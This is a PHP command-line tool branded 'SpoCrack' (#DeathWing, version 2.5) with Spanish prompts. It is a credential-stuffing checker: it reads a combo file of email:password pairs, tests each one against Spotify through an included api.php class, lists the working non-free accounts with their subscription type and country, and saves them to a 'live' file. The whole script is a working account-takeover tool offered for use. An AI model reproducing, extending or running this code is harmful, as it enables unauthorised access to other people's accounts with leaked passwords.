<?php
error_reporting(1);
include "api.php";
echo "\033[01;32m
  _________             _________                       __
 /   _____/_____   ____ \_   ___ \____________    ____ |  | __
 \_____  \\____ \ /  _ \/    \  \/\_  __ \__  \ _/ ___\|  |/ /
 /        \  |_> >  <_> )     \____|  | \// __ \\  \___|    <
/_______  /   __/ \____/ \______  /|__|  (____  /\___  >__|_ \
        \/|__|                  \/            \/     \/     \/
\033[0m\033[01;31m
#DeathWing\033[0m\n";
echo "\033[01;32mversion: 2.5\033[0m\n";
$ruta = readline("Combo: ");
echo "\033[01;37m======================================\033[0m\n";
echo "\033[01;33mSolo saldran cuentas
funcionales, espere con calma. \033[0m\n";
echo "\033[01;37m======================================\033[0m\n";
if(strpos($ruta, ".txt") == false){
	$ruta .= ".txt";
}
$oa = fopen($ruta, 'r');
$accounts = " ";
while ($a = fgetcsv($oa, 1000, ':')) {
    $sp       = new spotify();
    $result   = $sp->check($a[0], $a[1]);
    if (strpos($result, 'FREE') == false) {
        $info = json_decode($result, true);
        $i    = 0;
        foreach ($info as $clave => $valor) {
            if ($clave == "subscription" || $clave == "Country") {
                if ($clave == "subscription") {
                    $subs = $info["subscription"];
                }
                //echo  $clave;
                if ($clave == "Country") {
                    $country = $info["Country"];
                }
                //$accounts ="$a[0]:$a[1]|$subs|$country\n";
                $i++;
                if ($i == 1) {
                    echo "\033[01;32mCuenta: $a[0]:$a[1]|\033[0m";
                }
                if ($clave) {
                    /*foreach($valor as $clave2=>$valor2) {
                    echo "\033[01;32m$clave $valor2|\033[0m";
                    }*/
                    if ($i == 2) {
                        echo "\033[01;32m$subs|$country\033[0m\n";
                    }
                }
            }
        }
    } else {
    }
    $accounts .= "$a[0]:$a[1]|$subs|$country\n";
}
echo $accounts;
if(!empty($accounts)) {
 $save = readline("¿Deseas guardar? Y/n ");
 if(trim($save) == "Y") {
   $fname = readline("\033[1;33mArchivo\033[0m: ");
   if(empty($fname)){ 
     $fname = "/sdcard/spotibrute/tmp/live.txt";
   }
   if(strpos($fname, ".txt") == false){
        $fname .= ".txt";
    }
   $file = fopen($fname, "w") or die("¡No pude crear el archivo!");
   fwrite($file , $accounts);
   echo "\033[1;32mArchivo $filename creado correctamente\033[0m\n";
   fclose($file);
 }
 else {
 }
}
fclose($oa);
?>